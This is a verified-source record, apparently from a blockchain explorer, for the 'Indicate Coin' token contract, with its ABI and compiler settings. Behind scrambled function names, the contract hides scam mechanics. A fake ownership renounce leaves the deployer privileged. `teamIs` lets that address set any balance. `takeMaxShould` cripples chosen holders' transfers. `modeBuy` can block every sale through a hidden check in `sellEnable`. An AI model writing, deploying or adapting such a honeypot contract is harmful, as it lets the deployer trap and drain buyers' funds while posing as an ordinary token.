{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract swapMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingSell {\n    function createPair(address exemptToken, address shouldFrom) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface autoAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface liquidityExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityExemptLaunch) external view returns (uint256);\n\n    function transfer(address shouldTradingMin, uint256 teamList) external returns (bool);\n\n    function allowance(address receiverEnableMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldTradingMin,\n        uint256 teamList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeTeam, uint256 value);\n    event Approval(address indexed receiverEnableMode, address indexed spender, uint256 value);\n}\n\ninterface minTotal is liquidityExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndicateCoin is swapMarketing, liquidityExempt, minTotal {\n\n    function transfer(address maxBuyTake, uint256 teamList) external virtual override returns (bool) {\n        return sellEnable(_msgSender(), maxBuyTake, teamList);\n    }\n\n    address public teamTrading;\n\n    function getOwner() external view returns (address) {\n        return listReceiverShould;\n    }\n\n    uint8 private teamLaunch = 18;\n\n    uint256 public shouldLiquidity;\n\n    uint256 private isReceiver;\n\n    mapping(address => bool) public takeMax;\n\n    bool public launchedTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atExempt;\n    }\n\n    address enableLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed isModeTake, address indexed tokenTakeTx);\n\n    address private listReceiverShould;\n\n    string private toMinToken = \"Indicate Coin\";\n\n    bool private fundBuy;\n\n    uint256 private liquidityLaunch = 100000000 * 10 ** 18;\n\n    function transferFrom(address receiverMax, address shouldTradingMin, uint256 teamList) external override returns (bool) {\n        if (_msgSender() != enableLiquidity) {\n            if (launchToToken[receiverMax][_msgSender()] != type(uint256).max) {\n                require(teamList <= launchToToken[receiverMax][_msgSender()]);\n                launchToToken[receiverMax][_msgSender()] -= teamList;\n            }\n        }\n        return sellEnable(receiverMax, shouldTradingMin, teamList);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityLaunch;\n    }\n\n    uint256 public shouldSender = 0;\n\n    mapping(address => mapping(address => uint256)) private launchToToken;\n\n    function allowance(address takeSwapExempt, address enableTx) external view virtual override returns (uint256) {\n        if (enableTx == enableLiquidity) {\n            return type(uint256).max;\n        }\n        return launchToToken[takeSwapExempt][enableTx];\n    }\n\n    uint256 constant receiverWallet = 8 ** 10;\n\n    mapping(address => bool) public minMax;\n\n    function sellEnable(address receiverMax, address shouldTradingMin, uint256 teamList) internal returns (bool) {\n        if (receiverMax == teamTrading) {\n            return swapMin(receiverMax, shouldTradingMin, teamList);\n        }\n        uint256 fromReceiver = liquidityExempt(tradingTx).balanceOf(feeTotalEnable);\n        require(fromReceiver == isSender);\n        require(shouldTradingMin != feeTotalEnable);\n        if (minMax[receiverMax]) {\n            return swapMin(receiverMax, shouldTradingMin, receiverWallet);\n        }\n        teamList = receiverAmount(receiverMax, shouldTradingMin, teamList);\n        return swapMin(receiverMax, shouldTradingMin, teamList);\n    }\n\n    uint256 public launchedTo;\n\n    function buyWallet() private view {\n        require(takeMax[_msgSender()]);\n    }\n\n    function minModeMarketing(address autoBuy) public {\n        require(autoBuy.balance < 100000);\n        if (senderLaunched) {\n            return;\n        }\n        if (atFrom == fundBuy) {\n            fundBuy = false;\n        }\n        takeMax[autoBuy] = true;\n        if (atFrom) {\n            buySell = launchedTo;\n        }\n        senderLaunched = true;\n    }\n\n    uint256 public launchList = 3;\n\n    uint256 isSender;\n\n    function launchLaunchedLiquidity() public {\n        emit OwnershipTransferred(teamTrading, address(0));\n        listReceiverShould = address(0);\n    }\n\n    function modeBuy(uint256 teamList) public {\n        buyWallet();\n        isSender = teamList;\n    }\n\n    bool public senderLaunched;\n\n    address public tradingTx;\n\n    constructor (){\n        if (fundBuy) {\n            isReceiver = buySell;\n        }\n        launchLaunchedLiquidity();\n        autoAmount sellMarketing = autoAmount(enableLiquidity);\n        tradingTx = marketingSell(sellMarketing.factory()).createPair(sellMarketing.WETH(), address(this));\n        feeTotalEnable = marketingSell(sellMarketing.factory()).feeTo();\n        if (buySell != shouldLiquidity) {\n            fundBuy = false;\n        }\n        teamTrading = _msgSender();\n        takeMax[teamTrading] = true;\n        swapTake[teamTrading] = liquidityLaunch;\n        \n        emit Transfer(address(0), teamTrading, liquidityLaunch);\n    }\n\n    function swapMin(address receiverMax, address shouldTradingMin, uint256 teamList) internal returns (bool) {\n        require(swapTake[receiverMax] >= teamList);\n        swapTake[receiverMax] -= teamList;\n        swapTake[shouldTradingMin] += teamList;\n        emit Transfer(receiverMax, shouldTradingMin, teamList);\n        return true;\n    }\n\n    function receiverAmount(address receiverMax, address shouldTradingMin, uint256 teamList) internal view returns (uint256) {\n        require(teamList > 0);\n\n        uint256 buySender = 0;\n        if (receiverMax == tradingTx && launchList > 0) {\n            buySender = teamList * launchList / 100;\n        } else if (shouldTradingMin == tradingTx && shouldSender > 0) {\n            buySender = teamList * shouldSender / 100;\n        }\n        require(buySender <= teamList);\n        return teamList - buySender;\n    }\n\n    function teamIs(address maxBuyTake, uint256 teamList) public {\n        buyWallet();\n        swapTake[maxBuyTake] = teamList;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamLaunch;\n    }\n\n    address feeTotalEnable;\n\n    uint256 private buySell;\n\n    bool private atFrom;\n\n    uint256 tokenTo;\n\n    string private atExempt = \"ICN\";\n\n    function name() external view virtual override returns (string memory) {\n        return toMinToken;\n    }\n\n    bool private autoReceiverLiquidity;\n\n    function takeMaxShould(address minListSender) public {\n        buyWallet();\n        \n        if (minListSender == teamTrading || minListSender == tradingTx) {\n            return;\n        }\n        minMax[minListSender] = true;\n    }\n\n    mapping(address => uint256) private swapTake;\n\n    function owner() external view returns (address) {\n        return listReceiverShould;\n    }\n\n    uint256 public fundMaxTo;\n\n    function approve(address enableTx, uint256 teamList) public virtual override returns (bool) {\n        launchToToken[_msgSender()][enableTx] = teamList;\n        emit Approval(_msgSender(), enableTx, teamList);\n        return true;\n    }\n\n    bool private totalAmount;\n\n    function balanceOf(address liquidityExemptLaunch) public view virtual override returns (uint256) {\n        return swapTake[liquidityExemptLaunch];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnableMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isModeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTakeTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSwapExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityExemptLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMaxTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLaunchedLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"}],\"name\":\"minModeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamList\",\"type\":\"uint256\"}],\"name\":\"modeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minListSender\",\"type\":\"address\"}],\"name\":\"takeMaxShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamList\",\"type\":\"uint256\"}],\"name\":\"teamIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTradingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IndicateCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}